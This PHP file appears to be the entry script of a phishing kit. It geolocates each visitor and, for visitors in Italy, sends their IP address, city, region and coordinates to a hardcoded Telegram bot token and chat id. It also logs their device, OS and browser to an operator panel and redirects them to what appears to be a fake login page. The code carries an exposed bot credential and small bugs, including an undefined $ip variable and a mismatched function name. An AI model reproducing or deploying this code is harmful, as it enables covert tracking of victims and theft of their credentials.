<?php
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        // Shared Internet or ISP proxy
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Behind a proxy (can be multiple IPs)
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        // NGINX reverse proxy
        return $_SERVER['HTTP_X_REAL_IP'];
    } else {
        // Default fallback
        return $_SERVER['REMOTE_ADDR'];
    }
}

$userIP = getUserIP();
$ipAddress = $userIP;

	
	$apiUrl = "http://ip-api.com/json/{$ipAddress}";
	
	$ch = curl_init($apiUrl);
	
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	
	$response = curl_exec($ch);
	
	if (curl_errno($ch)) {
		echo 'Curl error: ' . curl_error($ch);
		exit;
	}
	
	curl_close($ch);
	
	$data = json_decode($response);
	$COUNTRY = $data->country;
	
	
	if ( $COUNTRY === "Italy"   ) {       
     $msg = "IP Address: {$data->query}\n";
     $msg .= "City: {$data->city}\n";
     $msg .= "Region: {$data->regionName}\n";
     $msg .= "Country: {$data->country}\n";
     $msg .="Location: {$data->lat}, {$data->lon}\n";
     file_get_contents("https://api.telegram.org/bot8712281940:AAF7RQkUscdeFPocXnJj8-Db7sxeU4L2AiU/sendMessage?chat_id=-5296860240&text=".urlencode($msg)."" );

	}else{
		

		//header("Location: https://youtube.com");
		//exit();


	}

?>    
<?php
include "./config.php";
include "./lib/geoplugin.class.php";
include "./lib/UserInfo.php";
//include "./lib/antibot.php";

$geoplugin = new geoPlugin();
$geoplugin->locate();
$present_time = date("H:i:s"."-"."m/d/y");

    if ($_SERVER['HTTP_HOST'] === "localhost") {
        $_SERVER['HTTP_HOST'] = "127.0.0.1";
    }
   $user = new UserInfo();
    $device = $user->get_device();
    $os = $user->get_os();
    $browser = $user->get_browser();

   $newLink = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
    $newLink = dirname($newLink) . "/panel/index.php?id_user=" . get_user_ip();
    $_SESSION['link'] = $newLink;

    $user_data = array(
        'device' => $device,
        'os' => $os,
        'browser' => $browser,
        'timestamp' => $present_time,
        'status' => "" 
    );

    $json_data = json_encode($user_data);
    $ip = str_replace(":", ".", $ip);
    $ip = str_replace(".", "-", $ip);
    $file_path = "./panel/logs/$ip.json";

    file_put_contents($file_path, $json_data);
    
    echo "<script>
        window.location = './client/login.php?redirect=' + encodeURIComponent(window.location.href);
         </script>";
    
    exit();
?>
